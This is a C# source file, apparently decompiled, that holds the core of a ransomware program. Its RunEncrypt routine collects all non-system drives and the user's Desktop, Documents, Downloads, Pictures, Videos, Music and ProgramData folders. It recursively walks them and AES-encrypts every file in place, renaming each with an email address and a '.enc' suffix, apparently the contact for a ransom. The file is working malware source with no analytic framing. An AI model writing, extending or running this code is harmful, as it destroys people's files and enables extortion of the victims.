using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.VisualBasic;

namespace SF;

internal static class Main
{
	private static readonly string Root = Environment.GetFolderPath(Environment.SpecialFolder.System);

	private static readonly string SystemDisk = Path.GetPathRoot(Root);

	public static readonly string DesktopDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private static readonly string MyComputerDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);

	private static readonly string DesktopDirectoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static readonly string FavoritesDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

	private static readonly string MyDocumentspDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string MyMusicDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private static readonly string HistoryDirectory = Environment.GetFolderPath(Environment.SpecialFolder.History);

	private static readonly string PersonalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static readonly string DownloadsDirectory = Interaction.Environ("USERPROFILE") + "\\Downloads";

	private static readonly string DocumentsDirectory = Interaction.Environ("USERPROFILE") + "\\Documents";

	private static readonly string PicturesDirectory = Interaction.Environ("USERPROFILE") + "\\Pictures";

	private static readonly string VideosDirectory = Interaction.Environ("USERPROFILE") + "\\Videos";

	private static readonly string MusicDirectory = Interaction.Environ("USERPROFILE") + "\\Music";

	private static readonly string UserProfile = Interaction.Environ("USERPROFILE");

	public static string[] ValidExtension = new string[1] { "*.*" };

	public static string Key { get; } = KeyGenerator.GetUniqueKey(133);


	private static string[] Folder { get; set; }

	private static string[] Files { get; set; }

	private static string ProgramData { get; } = SystemDisk + "\\ProgramData";


	public static void RunEncrypt()
	{
		string text = Encryption.Run();
		List<string> list = new List<string>();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text2 in array)
		{
			if (text2 != "C:\\")
			{
				list.Add(text2);
			}
		}
		list.Add(DesktopDirectory);
		list.Add(MyComputerDirectory);
		list.Add(DesktopDirectoryDirectory);
		list.Add(MyDocumentspDirectory);
		list.Add(MyMusicDirectory);
		list.Add(PersonalDirectory);
		list.Add(DownloadsDirectory);
		list.Add(DocumentsDirectory);
		list.Add(PicturesDirectory);
		list.Add(VideosDirectory);
		list.Add(MusicDirectory);
		list.Add(UserProfile);
		list.Add(FavoritesDirectory);
		list.Add(ProgramData);
		list.Add(SystemDisk + "\\Users\\");
		foreach (string item in list)
		{
			SearchFolder(item);
			SearchFile(item);
		}
	}

	internal static void SearchFolder(string name)
	{
		try
		{
			Folder = Directory.GetDirectories(name, "*", SearchOption.TopDirectoryOnly);
		}
		catch (Exception)
		{
			return;
		}
		string[] folder = Folder;
		foreach (string name2 in folder)
		{
			SearchFile(name2);
			SearchFolder(name2);
		}
	}

	internal static void SearchFile(string name)
	{
		string[] validExtension = ValidExtension;
		foreach (string text in validExtension)
		{
			try
			{
				Files = Directory.GetFiles(name, "*" + text, SearchOption.TopDirectoryOnly);
			}
			catch (Exception)
			{
				break;
			}
			string[] files = Files;
			foreach (string name2 in files)
			{
				Encrypt(name2);
			}
		}
	}

	internal static void Encrypt(string name)
	{
		try
		{
			string text = "user@gmail.com";
			byte[] bytes = Encryption.AesEncrypt(File.ReadAllBytes(name), Key);
			File.WriteAllBytes(name, bytes);
			File.Move(name, name + text + ".enc");
		}
		catch (Exception)
		{
		}
	}
}
